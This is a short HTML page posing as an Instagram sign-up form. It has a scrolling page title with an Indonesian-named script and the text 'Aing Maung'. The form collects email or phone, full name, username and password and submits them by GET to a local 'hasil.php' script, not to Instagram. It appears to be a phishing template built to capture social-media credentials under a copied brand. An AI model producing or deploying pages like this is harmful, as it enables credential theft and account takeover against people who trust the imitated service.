<html lang="en">
<head>
<font face="arial">
	<meta charset="UTF-8">
	<script language="javaScript">
var txt="Aing Maung";
var kecepatan=75;var segarkan=null;function bergerak() { document.title=txt;
txt=txt.substring(1,txt.length)+txt.charAt(0);
segarkan=setTimeout("bergerak()",kecepatan);}bergerak();
</script> 
	<link rel="stylesheet" href="style.css">
</head>
<body>
	<div id="login">
	<center><h1>Instagram</h1></center>
		<fieldset>
		<button><a href="http://facebook.com">Login With Facebook</a></button>
		<p>OR</p>
		<div class="border-p"></div></font>
			<form action="hasil.php" method="GET">
			<font face="billabong">
				<input type="email" name="email" placeholder="Mobile Number or Email">
				<input type="text" name="fullname" placeholder="Full Name">
				<input type="text" name="user" placeholder="Username">
				<input type="Password" name="password" placeholder="Password">
				<input type="Submit" name="Submit" value="SIgn Up">
				<div class="border-p"></div></font>
				<p><center>Sign Up to sign your account</center></p>
				<div id="bottom">
					<div class="content">
						<p><center>Have an account ? <a href="login">login</a></center></p>
			</form>
		</fieldset>
	</div>
</body>
</html>